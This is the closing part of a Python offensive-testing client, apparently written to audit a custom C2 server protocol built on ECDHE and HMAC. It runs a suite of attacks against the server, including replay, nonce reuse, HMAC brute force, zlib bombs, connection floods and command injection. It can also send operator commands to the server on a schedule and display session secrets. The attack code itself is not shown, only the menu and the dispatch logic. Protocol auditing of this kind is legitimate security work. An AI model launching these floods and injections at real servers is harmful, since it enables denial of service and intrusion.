    """Ejecuta toda la suite de tests automáticamente."""
    sep("SUITE COMPLETA DE TESTS OFENSIVOS")
    warn("Ejecutando todos los tests. Esto puede tardar ~2 minutos.")

    # Tests que necesitan conexión activa
    if not sock_global or not aes_global:
        err("Necesitas una sesión activa (conectado al servidor)")
        return

    suite = [
        ("Replay Attack",            lambda: exploit_replay()),
        ("Sequence Number Attacks",  exploit_seq_attacks),
        ("HMAC Corrupt Tag",         exploit_corrupt_hmac),
        ("Nonce Reuse",              exploit_nonce_reuse),
        ("AES-GCM Bit-Flip",         exploit_aes_gcm_bitflip),
        ("Oversized Packet",         exploit_oversized),
        ("Zlib Bomb",                exploit_zlib_bomb),
        ("Fragmented Handshake",     exploit_fragmented_handshake),
        ("Partial Packet",           exploit_partial_packet),
        ("Connection Flood",         lambda: exploit_conn_flood(30)),
        ("Heartbeat Flood",          lambda: exploit_heartbeat_flood(100)),
        ("Wrong ECDHE Curve",        exploit_wrong_curve),
        ("Omit Handshake HMAC",      exploit_omit_handshake_hmac),
        ("HMAC Downgrade",           exploit_hmac_downgrade),
        ("HMAC Brute-Force",         exploit_hmac_bruteforce),
        ("Timing Side-Channel",      exploit_timing),
        ("Protocol Fuzzer",          lambda: exploit_fuzz(30)),
        ("Fingerprint Consistency",  exploit_fingerprint_bypass),
        ("Command Injection",        exploit_command_injection),
        ("Concurrent Sessions",      lambda: exploit_concurrent_stress(10)),
    ]

    passed = failed = vulns = 0
    for name, fn in suite:
        print(f"\n{BLD}{BLU}▶ {name}{R}")
        try:
            fn()
            passed += 1
        except Exception as e:
            err(f"{name} → excepción: {e}")
            failed += 1
        time.sleep(0.5)

    sep("RESUMEN")
    print(f"  {B_GRN}Tests ejecutados:{R} {passed + failed}")
    print(f"  {B_GRN}Completados:{R}     {passed}")
    print(f"  {B_RED}Errores:{R}         {failed}")
    if results:
        vulns = sum(1 for v in results.values() if v)
        print(f"  {B_RED}Vulnerabilidades:{R} {vulns}")
        if vulns:
            print(f"\n{RED}  Vulnerabilidades detectadas:{R}")
            for k, v in results.items():
                if v:
                    print(f"    {RED}✗{R} {k}")
        else:
            print(f"\n{GRN}  No se detectaron vulnerabilidades conocidas.{R}")

# ══════════════════════════════════════════════════════
# SCHEDULED COMMANDS
# ══════════════════════════════════════════════════════
scheduled_tasks    = []
_stop_scheduled    = threading.Event()

def _scheduled_worker():
    while not _stop_scheduled.is_set():
        now = time.time()
        for t in scheduled_tasks[:]:
            if now >= t['next_run']:
                print(f"{MAG}[SCHED] {t['cmd']}{R}")
                tx_queue.put(t['cmd'])
                t['next_run'] = now + t['interval']
                t['count'] += 1
        time.sleep(1)

def start_scheduled(cmd, interval):
    scheduled_tasks.append({'cmd': cmd, 'interval': interval,
                             'next_run': time.time() + interval, 'count': 0})
    ok(f"Programado '{cmd}' cada {interval}s")

# ══════════════════════════════════════════════════════
# HELP & UI
# ══════════════════════════════════════════════════════

def show_help():
    print(f"""
{BLD}{B_CYN}╔══════════════════════════════════════════════════════════════╗
║         BLACKBERRY C2 — OFFENSIVE TESTING CLIENT             ║
║          ECDHE + HMAC Protocol Security Auditor              ║
╚══════════════════════════════════════════════════════════════╝{R}

{BLD}{GRN}BASIC{R}
  help               Este menú
  show               Ver auto-response rules
  set <k>=<v>        Añadir/modificar auto-response rule
  clear              Limpiar terminal
  info               Info de sesión activa
  exit               Salir

{BLD}{MAG}SCHEDULED{R}
  for <cmd> sends <N>s    Ejecutar comando cada N segundos
  for show                Ver comandos programados
  stop                    Parar todos los programados

{BLD}{RED}EXPLOITS — PROTOCOLO{R}
  replay [seq]       Replay attack (seq duplicado)
  seq-attacks        Ataques a números de secuencia
  nonce-reuse        AES-GCM nonce reuse
  bitflip            Bit-flip en ciphertext (GCM auth)
  partial            Partial packet (half-open send)
  fuzz [N]           Fuzzer de protocolo estructural (def 40)

{BLD}{RED}EXPLOITS — HANDSHAKE / AUTH{R}
  hmac-downgrade     Prueba múltiples HMAC secrets incorrectos
  hmac-corrupt       Corrompe HMAC tag de un paquete
  hmac-bruteforce    Wordlist de HMAC secrets
  wrong-curve        Handshake con curva ECDHE incorrecta
  omit-hmac          Handshake sin enviar HMAC (32 bytes)
  fingerprint        Consistencia de fingerprints ECDHE

{BLD}{RED}EXPLOITS — DoS / STRESS{R}
  oversized          Paquete con length prefix 100MB+
  zlib-bomb          Decompression bomb (50MB expand)
  conn-flood [N]     Flood de conexiones TCP (def 50)
  hb-flood [N]       Flood de heartbeats (def 200)
  timing             Timing side-channel (HMAC comparison)
  stress [N]         N sesiones concurrentes (def 20)

{BLD}{RED}EXPLOITS — INJECTION{R}
  inject             Command injection payloads

{BLD}{YEL}SUITE{R}
  suite              Ejecutar TODOS los tests automáticamente

{BLD}{CYN}PROTOCOLO{R}
  AES-256-GCM + ECDHE P-256 | HMAC-SHA256 por paquete
  Anti-replay: sequence numbers uint64
  Handshake: ECDH_PUBKEY: + [4:len][PEM] + [32:HMAC]
""")

def show_session_info():
    if not sock_global:
        warn("Sin conexión activa"); return
    print(f"""
{B_CYN}  Sesión activa{R}
  Host/Port    : {SERVER_HOST}:{SERVER_PORT}
  AES Key[:8]  : {aes_global[:8].hex() if aes_global else 'N/A'}
  HMAC Secret  : {HMAC_PRE_SHARED_SECRET.decode(errors='replace')}
  Seq actual   : {_seq}
  Paquetes TX  : {len(captured)}
  Auto-rules   : {len(AUTO_RESPONSES)}
""")

# ══════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════

BANNER = f"""{B_RED}
  ██████╗ ██████╗     ████████╗███████╗███████╗████████╗
  ██╔══██╗██╔══██╗       ██║   ██╔════╝██╔════╝╚══██╔══╝
  ██████╔╝██████╔╝       ██║   █████╗  ███████╗   ██║
  ██╔══██╗██╔══██╗       ██║   ██╔══╝  ╚════██║   ██║
  ██████╔╝██████╔╝       ██║   ███████╗███████║   ██║
  ╚═════╝ ╚═════╝        ╚═╝   ╚══════╝╚══════╝   ╚═╝{R}
{BLD}{CYN}  Offensive Testing Client — ECDHE + HMAC Auditor{R}
{DIM}  Solo para entornos autorizados.{R}
"""

CMDS = [
    "help", "show", "set", "clear", "exit", "info", "suite",
    "for", "stop",
    "replay", "seq-attacks", "nonce-reuse", "bitflip", "partial",
    "fuzz",
    "hmac-downgrade", "hmac-corrupt", "hmac-bruteforce",
    "wrong-curve", "omit-hmac", "fingerprint",
    "oversized", "zlib-bomb", "conn-flood", "hb-flood",
    "timing", "stress", "inject",
]

def main():
    global sock_global, aes_global, HMAC_PRE_SHARED_SECRET

    print(BANNER)

    # Parsear args
    host = SERVER_HOST
    port = SERVER_PORT
    argv = sys.argv[1:]
    i = 0
    while i < len(argv):
        a = argv[i]
        if a in ('-H', '--host') and i + 1 < len(argv):
            host = argv[i + 1]; i += 2; continue
        if a in ('-p', '--port') and i + 1 < len(argv):
            try: port = int(argv[i + 1])
            except ValueError: pass
            i += 2; continue
        if a in ('--hmac', '-m') and i + 1 < len(argv):
            HMAC_PRE_SHARED_SECRET = _parse_hmac(argv[i + 1])
            i += 2; continue
        i += 1

    info(f"Conectando a {host}:{port}...")
    try:
        s = socket.socket()
        s.settimeout(CONNECT_TIMEOUT)
        s.connect((host, port))
        ok(f"Conectado a {host}:{port}\n")
    except Exception as e:
        err(f"Conexión fallida: {e}"); return

    sock_global = s
    try:
        aes_key, srv_pem = handshake(s)
        aes_global = aes_key
        fp = ':'.join(hashlib.sha256(srv_pem).hexdigest()[i:i+2]
                      for i in range(0, 64, 2))
        ok(f"Handshake ECDHE completado")
        info(f"Server FP : {fp[:39]}...")
        info(f"AES Key   : {aes_key[:8].hex()}...")
    except Exception as e:
        err(f"Handshake falló: {e}"); return

    threading.Thread(target=send_worker,      args=(s, aes_key), daemon=True).start()
    threading.Thread(target=recv_loop,        args=(s, aes_key), daemon=True).start()
    threading.Thread(target=_scheduled_worker,                   daemon=True).start()

    session = PromptSession(completer=WordCompleter(CMDS, ignore_case=True))
    print(f"{CYN}  'help' para ver todos los exploits disponibles{R}\n")

    while True:
        try:
            cmd = session.prompt("BBTest> ").strip()
            if not cmd: continue

            # ── básicos
            if cmd == "help":             show_help(); continue
            if cmd == "show":
                print(f"\n{CYN}{'─'*60}{R}")
                for k, v in AUTO_RESPONSES.items():
                    print(f"  {YEL}{k:<28}{R} → {v[:40]}")
                print(f"{CYN}{'─'*60}{R}\n")
                continue
            if cmd == "clear":            os.system("clear"); continue
            if cmd == "info":             show_session_info(); continue
            if cmd == "exit":             info("Saliendo..."); os._exit(0)
            if cmd == "suite":            run_full_suite(); continue

            # ── scheduled
            if cmd.startswith("for "):
                if "sends" in cmd:
                    try:
                        p1, p2 = cmd.split(" sends ", 1)
                        iv = int(p2.strip().rstrip('s'))
                        start_scheduled(p1[4:].strip(), iv)
                    except ValueError:
                        err("Formato: for <cmd> sends <N>s")
                elif "show" in cmd:
                    if not scheduled_tasks:
                        warn("Sin comandos programados")
                    else:
                        for t in scheduled_tasks:
                            nxt = int(t['next_run'] - time.time())
                            print(f"  {t['cmd']:<30} cada {t['interval']}s  ×{t['count']}  (próx: {nxt}s)")
                continue
            if cmd == "stop":
                scheduled_tasks.clear()
                ok("Comandos programados detenidos"); continue

            # ── set rule / set hmac
            if cmd.startswith("set ") and "=" in cmd:
                k, v = cmd[4:].split("=", 1)
                k, v = k.strip(), v.strip()
                if k.lower() == "hmac":
                    HMAC_PRE_SHARED_SECRET = _parse_hmac(v)
                    ok(f"HMAC secret actualizado → {HMAC_PRE_SHARED_SECRET!r}")
                else:
                    AUTO_RESPONSES[k] = v
                    ok(f"Rule: {k} → {v}")
                continue

            # ── exploits protocolo
            if cmd == "replay":             exploit_replay(); continue
            if cmd.startswith("replay "):
                try:   exploit_replay(int(cmd.split()[1]))
                except ValueError: err("replay <seq_num>")
                continue
            if cmd == "seq-attacks":        exploit_seq_attacks(); continue
            if cmd == "nonce-reuse":        exploit_nonce_reuse(); continue
            if cmd == "bitflip":            exploit_aes_gcm_bitflip(); continue
            if cmd == "partial":            exploit_partial_packet(); continue
            if cmd.startswith("fuzz"):
                parts = cmd.split()
                n = int(parts[1]) if len(parts) > 1 else 40
                exploit_fuzz(n); continue

            # ── exploits handshake/auth
            if cmd == "hmac-downgrade":     exploit_hmac_downgrade(); continue
            if cmd == "hmac-corrupt":       exploit_corrupt_hmac(); continue
            if cmd == "hmac-bruteforce":    exploit_hmac_bruteforce(); continue
            if cmd == "wrong-curve":        exploit_wrong_curve(); continue
            if cmd == "omit-hmac":          exploit_omit_handshake_hmac(); continue
            if cmd == "fingerprint":        exploit_fingerprint_bypass(); continue

            # ── exploits DoS/stress
            if cmd == "oversized":          exploit_oversized(); continue
            if cmd == "zlib-bomb":          exploit_zlib_bomb(); continue
            if cmd.startswith("conn-flood"):
                parts = cmd.split()
                exploit_conn_flood(int(parts[1]) if len(parts) > 1 else 50); continue
            if cmd.startswith("hb-flood"):
                parts = cmd.split()
                exploit_heartbeat_flood(int(parts[1]) if len(parts) > 1 else 200); continue
            if cmd == "timing":             exploit_timing(); continue
            if cmd.startswith("stress"):
                parts = cmd.split()
                exploit_concurrent_stress(int(parts[1]) if len(parts) > 1 else 20); continue

            # ── exploits injection
            if cmd == "inject":             exploit_command_injection(); continue

            # ── comando normal al servidor
            tx_queue.put(cmd)

        except KeyboardInterrupt:
            print(f"\n{YEL}  Ctrl+C — usa 'exit' para salir{R}")
        except Exception as e:
            err(f"Error en shell: {e}")

if __name__ == "__main__":
    main()